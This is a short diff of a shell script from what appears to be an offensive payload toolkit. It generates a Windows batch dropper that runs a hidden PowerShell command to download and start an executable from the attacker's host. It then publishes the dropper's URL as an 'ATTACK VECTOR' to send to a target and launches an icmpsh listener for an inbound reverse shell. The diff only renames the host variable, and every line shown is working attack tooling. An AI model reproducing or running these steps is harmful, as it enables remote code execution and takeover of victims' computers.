@@ -11318,7 +11318,7 @@ fi
 ## Build batch dropper
 echo "[☠] Building batch dropper: $N4m.bat ..";sleep 2
 echo "@echo off" > $IPATH/output/$N4m.bat
-echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$IP/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
+echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
 echo "exit" >> $IPATH/output/$N4m.bat
 
 
@@ -11333,11 +11333,11 @@ cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
 echo "[☠] Starting apache2 webserver ..";sleep 1
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
-echo "- ATTACK VECTOR: http://$IP/$N4m.bat"
+echo "- ATTACK VECTOR: http://$lhost/$N4m.bat"
 echo "---"
 echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
 cd $IPATH/bin/icmpsh
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $IP $target"
+xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $lhost $target"
 cd $IPATH
 
 
